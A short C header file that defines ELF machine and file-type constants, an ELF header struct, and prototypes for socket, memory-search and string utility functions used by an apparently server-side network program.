#pragma once

#include "server.h"
#include "includes.h"

#define BUFFER_SIZE 4096

#define EI_NIDENT 16
#define EI_DATA 5

#define EE_NONE 0
#define EE_LITTLE 1
#define EE_BIG 2

#define ET_NOFILE 0
#define ET_REL 1
#define ET_EXEC 2
#define ET_DYN 3
#define ET_CORE 4

#define EM_NONE 0
#define EM_M32 1
#define EM_SPARC 2
#define EM_386 3
#define EM_68K 4
#define EM_88K 5
#define EM_486 6
#define EM_860 7
#define EM_MIPS 8

#define EM_MIPS_RS3_LE 10
#define EM_MIPS_RS4_BE 10

#define EM_PARISC 15
#define EM_SPARC32PLUS 18
#define EM_PPC 20
#define EM_PPC64 21
#define EM_SPU 23
#define EM_ARM 40
#define EM_SH 42
#define EM_SPARCV9 43
#define EM_H8_300 46
#define EM_IA_64 50
#define EM_X86_64 62
#define EM_S390 22
#define EM_CRIS 76
#define EM_M32R 88
#define EM_MN10300 89
#define EM_OPENRISC 92
#define EM_BLACKFIN 106
#define EM_ALTERA_NIOS2 113
#define EM_TI_C6000 140
#define EM_AARCH64 183
#define EM_TILEPRO 188
#define EM_MICROBLAZE 189
#define EM_TILEGX 191
#define EM_FRV 0x5441
#define EM_AVR32 0x18ad
#define EM_ARC 93
#define EM_RCE 39

/*struct elf_hdr
{
    uint8_t e_ident[EI_NIDENT];
    uint16_t e_type, e_machine;
    uint32_t e_version;
} __attribute__((packed));*/

struct elf_hdr
{
    uint8_t e_ident[EI_NIDENT];
    uint16_t e_type, e_machine;
    uint32_t e_version;
};

int util_socket_and_bind(struct server *srv);
int util_memsearch(char *buf, int buf_len, char *mem, int mem_len);
BOOL util_sockprintf(int fd, const char *fmt, ...);
char *util_trim(char *str);
